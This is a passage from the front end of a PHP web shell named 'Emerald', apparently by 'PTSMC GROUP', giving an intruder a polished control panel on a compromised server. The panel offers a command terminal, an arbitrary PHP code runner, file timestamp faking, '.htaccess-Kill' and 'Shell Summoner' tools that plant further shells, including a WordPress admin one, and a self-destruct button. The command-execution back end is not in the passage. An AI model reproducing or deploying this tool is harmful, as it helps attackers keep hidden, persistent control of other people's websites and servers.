        .terminal-loader { width: 16px; height: 16px; border: 2px solid #555; border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
        .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 1001; }
        @keyframes slideIn { to { opacity: 1; transform: translateX(0); } }
        .message { padding: 15px 20px; margin-bottom: 10px; border-radius: var(--border-radius-sm); color: #fff; box-shadow: var(--shadow); opacity: 0; transform: translateX(20px); animation: slideIn 0.3s forwards; display: flex; align-items: center; gap: 10px; }
        .message.success { background-color: var(--success-color); } .message.error { background-color: var(--danger-color); }
        #loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 9999; display: none; justify-content: center; align-items: center; backdrop-filter: blur(5px); animation: fadeIn 0.3s; }
        .spinner { width: 50px; height: 50px; border: 5px solid var(--border-color); border-top-color: var(--primary-color); border-radius: 50%; animation: spin 1s linear infinite; }
        #image-viewer { background: rgba(0,0,0,0.85); }
        #image-viewer .modal-content { background: transparent; box-shadow: none; border: none; max-width: 95vw; max-height: 95vh; }
        #image-viewer img { max-width: 100%; max-height: 100%; object-fit: contain; }
        .image-nav { position: absolute; top: 50%; transform: translateY(-50%); width: 50px; height: 50px; background: rgba(0,0,0,0.3); color: white; border: none; border-radius: 50%; font-size: 24px; cursor: pointer; transition: background 0.2s; z-index: 1002; }
        .image-nav:hover { background: rgba(0,0,0,0.6); }
        #image-prev { left: 20px; } #image-next { right: 20px; }
        #image-viewer-close { position: absolute; top: 20px; right: 20px; font-size: 30px; }

        #drop-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 9998; display: none; justify-content: center; align-items: center; backdrop-filter: blur(5px); color: #fff; text-align: center; }
        #drop-overlay-content { border: 3px dashed var(--primary-color); padding: 50px; border-radius: 20px; }
        #drop-overlay-content .feather { font-size: 60px; margin-bottom: 20px; }
        #upload-progress-list { list-style: none; max-height: 50vh; overflow-y: auto; }
        .upload-progress-item { margin-bottom: 15px; }
        .upload-progress-item p { margin-bottom: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .progress-bg { width: 100%; background: var(--border-color); height: 10px; border-radius: 5px; }
        .progress-fill { height: 100%; background: var(--success-color); border-radius: 5px; transition: width 0.1s; }
        .upload-status { font-size: 12px; color: var(--text-secondary); }
        .upload-status.error { color: var(--danger-color); }
        
        /* New Server Hub Styles */
        .server-hub-tabs { display: flex; border-bottom: 1px solid var(--border-color); margin: -25px -25px 25px -25px; padding: 0 25px; }
        .server-hub-tab { padding: 10px 15px; cursor: pointer; color: var(--text-secondary); font-weight: 600; border-bottom: 2px solid transparent; }
        .server-hub-tab.active { color: var(--primary-color); border-bottom-color: var(--primary-color); }
        .server-hub-content { display: none; }
        .server-hub-content.active { display: block; }
        #server-info-phpinfo-iframe { width: 100%; height: 60vh; border: none; background: #fff; border-radius: var(--border-radius-sm); }
        .server-info-table { width: 100%; border-collapse: collapse; font-size: 13px; }
        .server-info-table td { padding: 8px; border: 1px solid var(--border-color); word-break: break-all; }
        .server-info-table td:first-child { font-weight: bold; background: rgba(0,0,0,0.2); }
        #php-code-output { margin-top: 15px; background: #000; color: #fff; padding: 15px; border-radius: var(--border-radius-sm); white-space: pre-wrap; font-family: monospace; max-height: 30vh; overflow-y: auto; }

        #menu-toggle { display: none; }
        @media (max-width: 1200px) {
            .list-view .header-owner, .list-view .file-owner { display: none; }
        }
        @media (max-width: 992px) {
            .sidebar { transform: translateX(-100%); z-index: 1001; }
            body.sidebar-open .sidebar { transform: translateX(0); }
            .main-content { margin-left: 0; width: 100%; }
            #menu-toggle { display: block; position: fixed; top: 20px; left: 20px; z-index: 1002; background: var(--card-bg); border: 1px solid var(--border-color); border-radius: var(--border-radius-sm); width: 40px; height: 40px; color: var(--text-primary); font-size: 24px; cursor: pointer; }
            .main-header { padding-top: 70px; }
            .list-view .header-size, .list-view .header-date, .list-view .file-size, .list-view .file-date, .list-view .header-perms, .list-view .file-perms { display: none; }
            .list-view .file-info { flex-direction: column; align-items: flex-start; gap: 5px; }
            .list-view .file-details { width: 100%; }
            .bottom-header-row { flex-direction: column; align-items: stretch; }
        }
    </style>
</head>
<body class="light-mode">
    <div id="loading-overlay"><div class="spinner"></div></div>
    <div id="drop-overlay"><div id="drop-overlay-content"><i data-feather="upload-cloud"></i><h1>Drop files to upload</h1></div></div>
    <button id="menu-toggle"><i data-feather="menu"></i></button>

    <aside class="sidebar">
        <div class="sidebar-header">
            <h1>Emerald</h1>
            <div class="subtitle">v8.2 | PTSMC GROUP</div>
        </div>
        
        <div class="sidebar-section">
            <h2>Server Info</h2>
            <div class="stat-cards">
                <div class="stat-card"><span class="label">OS</span><span class="value"><?= $server_info['os'] ?></span></div>
                <div class="stat-card"><span class="label">Software</span><span class="value"><?= htmlspecialchars($server_info['software']) ?></span></div>
                <div class="stat-card"><span class="label">PHP Ver</span><span class="value"><?= $server_info['php_version'] ?></span></div>
                <div class="stat-card"><span class="label">Server IP</span><span class="value"><?= $server_info['server_ip'] ?></span></div>
            </div>
            <div class="stat-cards" style="margin-top:10px;">
                <div class="stat-card" style="grid-column: 1 / 3;"><span class="label">Disk Usage</span><div class="progress-bar"><div class="progress-bar-inner" style="width: <?= round($server_info['disk_percent']) ?>%;"></div></div></div>
            </div>
        </div>

        <div class="sidebar-section">
            <h2>Bookmarks</h2>
            <ul id="bookmarks-list">
                <?php
                if (empty($_SESSION['bookmarks'])) {
                    echo '<li style="color: var(--text-secondary); font-size: 14px;">No bookmarks yet.</li>';
                } else {
                    foreach ($_SESSION['bookmarks'] as $bookmark) {
                        if (is_dir($bookmark)) {
                            echo '<li><a href="?dir=' . urlencode($bookmark) . '" title="'.htmlspecialchars($bookmark).'">' . htmlspecialchars(basename($bookmark)) . '</a></li>';
                        }
                    }
                }
                ?>
            </ul>
        </div>

        <div class="sidebar-section" style="margin-top:auto;">
            <h2>Tools</h2>
            <?php if (isset($_SESSION['clipboard'])): ?>
            <div class="clipboard-info" style="padding:10px; font-size:13px; border:1px solid var(--border-color); display:flex; justify-content:space-between; align-items:center; margin-bottom: 10px; border-radius: var(--border-radius-sm);">
                <span><?= count($_SESSION['clipboard']['paths']) ?> item in <?= htmlspecialchars($_SESSION['clipboard']['action']) ?></span>
                <a href="?action=clear_clipboard&dir=<?= urlencode($dir) ?>" title="Clear Clipboard" style="color:var(--danger-color); text-decoration:none; font-weight:bold; font-size:18px;">&times;</a>
            </div>
            <?php endif; ?>
            <div class="sidebar-tools-grid">
                <button class="action-btn icon-only" id="upload-btn" title="Upload File"><i data-feather="upload"></i></button>
                <input type="file" id="upload-input-hidden" multiple style="display:none;">
                <button class="action-btn icon-only" onclick="handleRandomPath()" title="Random Path (Random)"><i data-feather="shuffle"></i></button>
                <button class="action-btn icon-only" onclick="openModal('searchModal')" title="Recursive Search"><i data-feather="search"></i></button>
                <button class="action-btn icon-only" onclick="openModal('contentSearchModal')" title="Content Search (Recursive)"><i data-feather="file-text"></i></button> 
                <button class="action-btn icon-only" onclick="openModal('linkToFileModal')" title="Link to File"><i data-feather="link"></i></button>
                <button class="action-btn icon-only" onclick="handleFetchHtb()" title="Fetch .htaccess-Backup"><i data-feather="terminal"></i></button>
                <button class="action-btn icon-only" onclick="handleFetchHtd()" title="Fetch .htaccess-Kill"><i data-feather="shield-off"></i></button>
                <button class="action-btn icon-only" onclick="handleSummonPtsmc()" title="PTSMC Shell Summoner"><i data-feather="zap"></i></button>
                <button class="action-btn icon-only" onclick="handleSummonWpPtsmc()" title="WordPress Admin Shell Summoner"><i data-feather="zap"></i><i data-feather="lock" style="width:12px; height:12px; margin-left:-8px;"></i></button>
                <button class="action-btn icon-only" onclick="openModal('wpCacheModal')" title="WordPress Cache Flusher"><i data-feather="wind"></i></button>
                <button class="action-btn icon-only" onclick="openModal('serverHubModal')" title="Server Hub"><i data-feather="server"></i></button>
                <button class="action-btn icon-only" onclick="openModal('aboutModal')" title="About"><i data-feather="help-circle"></i></button>
                <button class="action-btn icon-only" id="self-destruct-btn" title="Self Destruct" style="color: var(--danger-color);"><i data-feather="trash-2"></i></button>
                <button class="action-btn icon-only" onclick="openModal('grepModal')" title="Grep (Find Text in current folder)"><i data-feather="at-sign"></i></button>
            </div>
        </div>
    </aside>

    <main class="main-content">
        <header class="main-header">
            <div class="top-header-row">
                <div class="breadcrumbs-container">
                    <span id="bookmark-toggle" class="bookmark-toggle <?= in_array($dir, $_SESSION['bookmarks'] ?? []) ? 'bookmarked' : '' ?>" title="Toggle Bookmark"><i data-feather="star"></i></span>
                    <div class="breadcrumbs" id="breadcrumbs">
                        <?php
                            $path_parts = preg_split('/[\\\\\/]/', $dir, -1, PREG_SPLIT_NO_EMPTY);
                            $current_path = ''; $is_windows = (strpos($dir, ':') === 1);
                            $root_link = $is_windows ? '' : '/';
                            echo '<div class="breadcrumb-item"><a href="?dir='.$root_link.'"><i data-feather="database" style="width:16px;"></i> Root</a> / </div>';
                            foreach ($path_parts as $i => $part) {
                                if ($is_windows) { $current_path .= ($i == 0 ? '' : DIRECTORY_SEPARATOR) . $part; } else { $current_path .= DIRECTORY_SEPARATOR . $part; }
                                $is_last = ($i === count($path_parts) - 1);
                                echo '<div class="breadcrumb-item"><a href="?dir=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>' . (!$is_last ? ' /' : '') . '</div>';
                            }
                        ?>
                    </div>
                </div>
                <div class="server-info" title="User@Server IP"><?= htmlspecialchars($server_info['user'] . '@' . $server_info['server_ip']) ?></div>
                <div class="header-actions">
                    <div class="view-toggle">
                        <button id="list-view-btn" title="List View"><i data-feather="list"></i></button>
                        <button id="grid-view-btn" title="Grid View"><i data-feather="grid"></i></button>
                    </div>
                    <span id="theme-toggle" title="Toggle Theme"><i data-feather="moon"></i></span>
                    <a href="?logout" class="logout-btn">Logout</a>
                </div>
            </div>
            <div class="bottom-header-row">
                <div class="header-nav-actions">
                    <a href="?dir=<?= urlencode(dirname($dir)) ?>" title="Up One Level"><i data-feather="arrow-up"></i></a>
                    <a href="?dir=<?= urlencode(SCRIPT_DIR) ?>" title="Home Directory"><i data-feather="home"></i></a>
                    <form id="go-to-path-form" class="form-group">
                        <input type="text" name="path" placeholder="Go to path..." required value="<?= htmlspecialchars($dir) ?>">
                        <button type="submit">Go</button>
                    </form>
                    <form id="new-file-form" class="form-group"><input type="text" name="name" placeholder="New File..." required><button type="submit">Create</button></form>
                    <form id="new-folder-form" class="form-group"><input type="text" name="name" placeholder="New Folder..." required><button type="submit">Create</button></form>
                </div>
            </div>
        </header>

        <div class="content-wrapper">
            <div class="toolbar">
                <div class="select-all">
                    <input type="checkbox" id="select-all-checkbox" title="Select All">
                    <label for="select-all-checkbox">Select All</label>
                </div>
                <div class="filter-buttons">
                    <button id="filter-all" class="active" title="Show All Files"><i data-feather="eye"></i> All</button>
                    <button id="filter-images" title="Show Only Images"><i data-feather="image"></i> Images</button>
                    <button id="filter-archives" title="Show Only Archives"><i data-feather="archive"></i> Archives</button>
                    <button id="filter-code" title="Show Only Code Files"><i data-feather="code"></i> Code</button>
                </div>
                <input type="search" id="search-box" placeholder="Search in this directory...">
                <div id="item-count" class="item-count"></div>
            </div>
        
            <div id="file-list-container" class="list-view">
                </div>
        </div>
    </main>
    
    <button id="floating-terminal-btn" onclick="openModal('terminalModal')" title="Open Terminal (F1)">
        <i data-feather="terminal"></i>
        <span>Terminal</span>
    </button>
    
    <div id="selection-toolbar">
        <div class="selection-info">
            <span id="selection-count">0</span> items selected
            <span id="selection-total-size"></span>
        </div>
        <div class="selection-actions">
            <button title="Rename (F2)" id="selection-rename"><i data-feather="edit-3"></i></button>
            <button title="Mass Rename" id="selection-mass-rename"><i data-feather="edit"></i></button> <button title="Change Permissions" id="selection-chmod"><i data-feather="shield"></i></button>
            <button title="Change Time" id="selection-touch"><i data-feather="clock"></i></button>
            <button title="Copy" id="selection-copy"><i data-feather="copy"></i></button>
            <button title="Cut" id="selection-cut"><i data-feather="scissors"></i></button>
            <button title="Paste" id="selection-paste" style="display: <?= isset($_SESSION['clipboard']) ? 'flex' : 'none' ?>"><i data-feather="clipboard"></i></button>
            <button title="Zip" id="selection-zip"><i data-feather="archive"></i></button>
            <button title="Delete (Del)" id="selection-delete" class="danger"><i data-feather="trash-2"></i></button>
        </div>
    </div>

    <div id="context-menu">
        <button class="context-menu-item" id="ctx-preview"><i data-feather="eye"></i>Preview</button>
        <button class="context-menu-item" id="ctx-edit"><i data-feather="edit"></i>Edit</button>
        <button class="context-menu-item" id="ctx-rename"><i data-feather="edit-3"></i>Rename</button>
        <button class="context-menu-item" id="ctx-chmod"><i data-feather="shield"></i>Chmod</button>
        <button class="context-menu-item" id="ctx-touch"><i data-feather="clock"></i>Change Time</button>
        <div class="context-menu-separator"></div>
        <button class="context-menu-item" id="ctx-bookmark"><i data-feather="star"></i>Bookmark</button>
        <button class="context-menu-item" id="ctx-copy-path"><i data-feather="link-2"></i>Copy Path</button>
        <button class="context-menu-item" id="ctx-get-link"><i data-feather="globe"></i>Get Direct Link</button>
        <button class="context-menu-item" id="ctx-copy"><i data-feather="copy"></i>Copy</button>
        <button class="context-menu-item" id="ctx-cut"><i data-feather="scissors"></i>Cut</button>
        <button class="context-menu-item" id="ctx-paste"><i data-feather="clipboard"></i>Paste</button>
        <button class="context-menu-item" id="ctx-duplicate"><i data-feather="copy"></i>Duplicate</button>
        <button class="context-menu-item" id="ctx-extract"><i data-feather="archive"></i>Extract</button>
        <div class="context-menu-separator"></div>
        <button class="context-menu-item" id="ctx-properties"><i data-feather="info"></i>Properties</button>
        <button class="context-menu-item" id="ctx-delete" style="color:#e74c3c"><i data-feather="trash-2"></i>Delete</button>
    </div>

    <div id="confirmModal" class="modal"><div class="modal-content" style="max-width: 400px;"><div class="modal-header"><h3 id="confirm-title" class="modal-title">Confirmation</h3></div><div class="modal-body"><p id="confirm-message"></p></div><div class="modal-actions"><button type="button" class="btn-cancel" id="confirm-cancel">Cancel</button><button type="button" class="btn-danger" id="confirm-ok">Confirm</button></div></div></div>
    <div id="editorModal" class="modal"><div class="modal-content modal-lg"><div class="modal-header"><h3 class="modal-title" id="editor-title">Editor</h3><div class="modal-header-actions"><select id="editor-theme-selector" class="modal-form" style="padding: 5px; height: auto; width: 150px;"></select><button id="editor-font-decrease" class="header-btn" title="Decrease font size">A-</button><button id="editor-font-increase" class="header-btn" title="Increase font size">A+</button><button id="editor-fullscreen-btn" class="header-btn" title="Toggle Fullscreen"><i data-feather="maximize"></i></button><button class="modal-close" onclick="closeModal('editorModal')">&times;</button></div></div><form id="editor-form" style="display: contents;"><input type="hidden" id="edit-path" name="path"><div id="editor-container"><textarea id="code-editor" name="content"></textarea></div><div class="modal-actions" id="editor-actions"><button type="button" class="btn-cancel" onclick="closeModal('editorModal')">Cancel</button><button type="submit" class="btn-save">Save</button></div></form></div></div>
    <div id="chmodModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Change Permissions</h3><button class="modal-close" onclick="closeModal('chmodModal')">&times;</button></div><div class="modal-body"><form id="chmod-form" class="modal-form"><p id="chmod-info" style="margin-bottom:10px; color:var(--text-secondary);"></p><input type="text" id="chmod-mode" name="mode" required><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('chmodModal')">Cancel</button><button type="submit" class="btn-submit">Set</button></div></form></div></div></div>
    <div id="renameModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Rename</h3><button class="modal-close" onclick="closeModal('renameModal')">&times;</button></div><div class="modal-body"><form id="rename-form" class="modal-form"><input type="text" id="rename-new-name" name="new_name" required><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('renameModal')">Cancel</button><button type="submit" class="btn-submit">Rename</button></div></form></div></div></div>
    <div id="massRenameModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Mass Rename</h3><button class="modal-close" onclick="closeModal('massRenameModal')">&times;</button></div><div class="modal-body"><form id="mass-rename-form" class="modal-form"><p id="mass-rename-info" style="margin-bottom:10px; color:var(--text-secondary);"></p><div class="form-group"><label for="mass-rename-search">Search String (Case Sensitive)</label><input type="text" id="mass-rename-search" name="search" required></div><div class="form-group"><label for="mass-rename-replace">Replace With</label><input type="text" id="mass-rename-replace" name="replace"></div><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('massRenameModal')">Cancel</button><button type="submit" class="btn-submit">Rename All</button></div></form></div></div></div> <div id="touchModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Change Timestamp</h3><button class="modal-close" onclick="closeModal('touchModal')">&times;</button></div><div class="modal-body"><form id="touch-form" class="modal-form"><p style="margin-bottom:10px; color:var(--text-secondary);">Enter the new modification date and time. (Example: 2025-10-24 09:20:14)</p><input type="text" id="touch-datetime" name="datetime" required placeholder="YYYY-MM-DD HH:MM:SS"><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('touchModal')">Cancel</button><button type="submit" class="btn-submit">Set</button></div></form></div></div></div>
    <div id="terminalModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Terminal</h3><div class="modal-header-actions"><button id="terminal-fullscreen-btn" class="header-btn" title="Toggle Fullscreen"><i data-feather="maximize"></i></button><button class="modal-close" onclick="closeModal('terminalModal')">&times;</button></div></div><div id="terminal-output"></div><div id="terminal-input-container"><div id="terminal-prompt-container" style="display:flex;"><span id="terminal-prompt">&gt;</span><input type="text" id="terminal-input" autocomplete="off"></div></div><div class="resizer-se"></div></div></div>
    <div id="detailsModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title" id="details-title">Properties</h3><button class="modal-close" onclick="closeModal('detailsModal')">&times;</button></div><div class="modal-body"><table id="details-table"><tbody></tbody></table></div><div class="modal-actions"><button type="button" id="details-copy-path" class="btn-primary">Copy Path</button></div></div></div>
    <div id="image-viewer" class="modal"><div class="modal-content"><img id="preview-image" src=""><button id="image-prev" class="image-nav"><i data-feather="chevron-left"></i></button><button id="image-next" class="image-nav"><i data-feather="chevron-right"></i></button><button class="modal-close image-nav" id="image-viewer-close">&times;</button></div></div>
    <div id="uploadModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Upload Progress</h3><button class="modal-close" onclick="closeModal('uploadModal')">&times;</button></div><div class="modal-body"><ul id="upload-progress-list"></ul></div></div></div>
    <div id="aboutModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">About Emerald</h3><button class="modal-close" onclick="closeModal('aboutModal')">&times;</button></div><div class="modal-body" style="text-align:center;"><p>This script was created and developed by <strong>PTSMC GROUP</strong>, with a total visual and functional transformation by <strong>Lennumica</strong>. This version introduces a fully AJAX-powered interface, new features, and a smoother UX for a seamless, desktop-like experience.</p><p class="version" style="font-size:12px;opacity:0.7;margin-top:20px;">Version 8.2 (WordPress Admin Shell Summoner, Fix Change Time, Mass Rename & More) | @ljxinhere</p></div></div></div>
    <div id="grepModal" class="modal"><div class="modal-content modal-lg"><div class="modal-header"><h3 class="modal-title">Grep (Find text in current folder)</h3><button class="modal-close" onclick="closeModal('grepModal')">&times;</button></div><div class="modal-body"><form id="grep-form" class="modal-form"><div class="form-group"><label for="grep-query">Text to find</label><input type="text" id="grep-query" required></div><div class="form-group"><label for="grep-pattern">File pattern (e.g., *.php, *.txt)</label><input type="text" id="grep-pattern" value="*"></div><div class="modal-actions"><button type="submit" class="btn-primary">Search</button></div></form><div id="grep-results"></div></div></div></div>
    <div id="contentSearchModal" class="modal"><div class="modal-content modal-lg"><div class="modal-header"><h3 class="modal-title">Recursive Content Search</h3><button class="modal-close" onclick="closeModal('contentSearchModal')">&times;</button></div><div class="modal-body"><form id="content-search-form" class="modal-form"><div class="form-group"><label for="content-search-query">Text to find (Recursive)</label><input type="search" id="content-search-query" required></div><div class="modal-actions"><button type="submit" class="btn-primary">Search</button></div></form><div id="content-search-results"></div></div></div></div> <div id="linkToFileModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Convert Link to File</h3><button class="modal-close" onclick="closeModal('linkToFileModal')">&times;</button></div><div class="modal-body"><form id="link-to-file-form" class="modal-form"><div class="form-group"><label for="link-url">URL</label><input type="url" id="link-url" name="url" required placeholder="https://example.com/page.html"></div><div class="form-group"><label for="link-filename">Save as (filename)</label><input type="text" id="link-filename" name="filename" required></div><div class="form-group"><label for="link-ext">File Type</label><select id="link-ext" name="ext"><option value="html">HTML</option><option value="txt">TXT</option><option value="php">PHP</option></select></div><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('linkToFileModal')">Cancel</button><button type="submit" class="btn-submit">Save</button></div></form></div></div></div>

    <div id="wpCacheModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">WordPress Cache Flusher</h3><button class="modal-close" onclick="closeModal('wpCacheModal')">&times;</button></div><div class="modal-body"><p>This tool will attempt to find a WordPress installation in the parent directories and flush its object cache. This is useful for developers to see changes immediately.</p><div id="wp-cache-status" style="margin-top: 15px; padding: 10px; border-radius: var(--border-radius-sm); display: none;"></div></div><div class="modal-actions"><button type="button" class="btn-primary" id="wp-cache-flush-btn">Flush Cache</button></div></div></div>
    <div id="searchModal" class="modal"><div class="modal-content modal-lg"><div class="modal-header"><h3 class="modal-title">Recursive Search</h3><button class="modal-close" onclick="closeModal('searchModal')">&times;</button></div><div class="modal-body"><form id="search-form" class="modal-form"><div class="form-group"><label for="search-query">Search for file/folder name</label><input type="search" id="search-query" required></div><div class="modal-actions"><button type="submit" class="btn-primary">Search</button></div></form><div id="search-results"></div></div></div></div>
    <div id="serverHubModal" class="modal"><div class="modal-content modal-xl"><div class="modal-header"><h3 class="modal-title">Server Hub</h3><button class="modal-close" onclick="closeModal('serverHubModal')">&times;</button></div><div class="modal-body"><div class="server-hub-tabs"><div class="server-hub-tab active" data-tab="phpinfo">PHP Info</div><div class="server-hub-tab" data-tab="variables">Server Variables</div><div class="server-hub-tab" data-tab="php-config">PHP Config</div><div class="server-hub-tab" data-tab="php-runner">PHP Runner</div></div><div id="tab-phpinfo" class="server-hub-content active"><iframe id="server-info-phpinfo-iframe" src="?action=phpinfo"></iframe></div><div id="tab-variables" class="server-hub-content"><table class="server-info-table"><?php foreach ($_SERVER as $key => $value) echo "<tr><td>".htmlspecialchars($key)."</td><td>".htmlspecialchars(is_array($value) ? implode(', ', $value) : $value)."</td></tr>"; ?></table></div><div id="tab-php-config" class="server-hub-content"><table class="server-info-table"><tr><td>Disabled Functions</td><td><?= htmlspecialchars(ini_get('disable_functions') ?: 'None') ?></td></tr><tr><td>Memory Limit</td><td><?= htmlspecialchars(ini_get('memory_limit')) ?></td></tr><tr><td>Max Execution Time</td><td><?= htmlspecialchars(ini_get('max_execution_time')) ?>s</td></tr><tr><td>Upload Max Filesize</td><td><?= htmlspecialchars(ini_get('upload_max_filesize')) ?></td></tr><tr><td>Post Max Size</td><td><?= htmlspecialchars(ini_get('post_max_size')) ?></td></tr></table></div><div id="tab-php-runner" class="server-hub-content"><form id="php-runner-form" class="modal-form"><div class="form-group"><label for="php-code">Enter PHP code to execute:</label><textarea id="php-code" name="code" rows="8" style="font-family: monospace;"></textarea></div><div class="modal-actions" style="justify-content:flex-start;"><button type="submit" class="btn-primary">Execute</button></div></form><div id="php-code-output"></div></div></div></div></div>
    
    <div class="toast-container" id="toast-container"><?php if(isset($_SESSION['flash_message'])) { echo "<script>document.addEventListener('DOMContentLoaded', () => showToast('{$_SESSION['flash_message']['text']}', '{$_SESSION['flash_message']['type']}'));</script>"; unset($_SESSION['flash_message']); } ?></div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/closebrackets.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/dialog/dialog.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/search/searchcursor.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/search/search.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/search/jump-to-line.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/meta.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/clike/clike.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/python/python.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>


    <script>
    const G = {
        state: {
            allFiles: [],
            files: [],
            clipboard: <?= isset($_SESSION['clipboard']) ? 'true' : 'false' ?>,
            currentDir: '<?= addslashes($dir) ?>',
            currentUser: '<?= addslashes($current_user) ?>',
            sort: { by: 'name', order: 'asc' },
            view: 'list-view',
            contextTarget: null,
            imageFiles: [],
            currentImageIndex: -1,
            activeFilter: 'all',
        },
        dom: {},
        codeEditor: null,
        editorFontSize: 15,
        terminalHistory: [],
        terminalHistoryIndex: -1,
        resourceChart: null, // Ditinggalkan untuk mematuhi aturan "JANGAN HAPUS FUNGSI"
    };

    const ICONS = {
        'dir': 'folder', 'dir-up': 'corner-left-up', 'image': 'image', 'video': 'film',
        'audio': 'music', 'pdf': 'book', 'archive': 'archive', 'code': 'code', 'file': 'file',
        'php': 'code', 'js': 'code', 'html': 'code', 'css': 'file-text', 'json': 'file-text',
        'sql': 'database', 'md': 'file-text', 'txt': 'file-text', 'log': 'file-text', 'sh': 'terminal', 'py': 'code'
    };
    
    document.addEventListener('DOMContentLoaded', () => {
        cacheDom();
        initTheme(); // Akan mengatur tema ke Light Mode sesuai permintaan
        initView();
        initData();
        initEventListeners();
        initDraggableResizableTerminal();
        renderFiles();
        feather.replace();
        initResourceChart(); // Ditinggalkan untuk mematuhi aturan "JANGAN HAPUS FUNGSI"
    });

    function cacheDom() {
        G.dom.body = document.body;
        G.dom.fileListContainer = document.getElementById('file-list-container');
        G.dom.contextMenu = document.getElementById('context-menu');
        G.dom.selectionToolbar = document.getElementById('selection-toolbar');
        G.dom.selectionCount = document.getElementById('selection-count');
        G.dom.selectionTotalSize = document.getElementById('selection-total-size');
        G.dom.itemCount = document.getElementById('item-count');
        G.dom.terminalPrompt = document.getElementById('terminal-prompt-container');
        G.dom.bookmarkToggle = document.getElementById('bookmark-toggle');
    }

    function initData() {
        G.state.allFiles = <?= json_encode($items) ?>;
        G.state.files = G.state.allFiles;
        applyFilters();
        updateItemCount();
        sortFiles();
        G.terminalHistory = JSON.parse(localStorage.getItem('terminalHistory') || '[]');
        G.terminalHistoryIndex = G.terminalHistory.length;
    }

    function initTheme() {
        const themeToggle = document.getElementById('theme-toggle');
        // MODIFIKASI: Defaultkan ke light, dan timpa localStorage jika belum ada.
        let isLight = localStorage.getItem('theme') === 'light' || localStorage.getItem('theme') === null;

        if (isLight) {
            G.dom.body.classList.add('light-mode');
            themeToggle.innerHTML = '<i data-feather="sun"></i>';
        } else {
            G.dom.body.classList.remove('light-mode');
            themeToggle.innerHTML = '<i data-feather="moon"></i>';
        }
        localStorage.setItem('theme', isLight ? 'light' : 'dark');
        feather.replace();

        themeToggle.addEventListener('click', () => {
            G.dom.body.classList.toggle('light-mode');
            const isNowLight = G.dom.body.classList.contains('light-mode');
            localStorage.setItem('theme', isNowLight ? 'light' : 'dark');
            themeToggle.innerHTML = isNowLight ? '<i data-feather="sun"></i>' : '<i data-feather="moon"></i>';
            feather.replace();
            if (G.codeEditor) {
                const newTheme = isNowLight ? 'eclipse' : 'dracula';
                G.codeEditor.setOption('theme', newTheme);
                document.getElementById('editor-theme-selector').value = newTheme;
            }
            updateResourceChartTheme();
        });
    }

    function initView() {
        const savedView = localStorage.getItem('view') || 'list-view';
        setView(savedView);
        document.getElementById('list-view-btn').addEventListener('click', () => setView('list-view'));
        document.getElementById('grid-view-btn').addEventListener('click', () => setView('grid-view'));
    }

    function setView(view) {
        G.state.view = view;
        G.dom.fileListContainer.className = 'file-list-container ' + view;
        localStorage.setItem('view', view);
        document.getElementById('list-view-btn').classList.toggle('active', view === 'list-view');
        document.getElementById('grid-view-btn').classList.toggle('active', view === 'grid-view');
        renderFiles();
    }
    
    function initEventListeners() {
        document.getElementById('search-box').addEventListener('input', e => {
            applyFilters();
            renderFiles();
        });

        document.getElementById('select-all-checkbox').addEventListener('change', e => {
            document.querySelectorAll('.file-checkbox:not(:disabled)').forEach(cb => {
                cb.checked = e.target.checked;
                cb.closest('.file-item').classList.toggle('selected', e.target.checked);
            });
            updateSelectionToolbar();
        });
        
        document.getElementById('go-to-path-form').addEventListener('submit', e => {
            e.preventDefault();
            const path = e.target.elements.path.value;
            window.location.href = '?dir=' + encodeURIComponent(path);
        });

        document.getElementById('menu-toggle').addEventListener('click', () => G.dom.body.classList.toggle('sidebar-open'));
        document.addEventListener('click', (e) => {
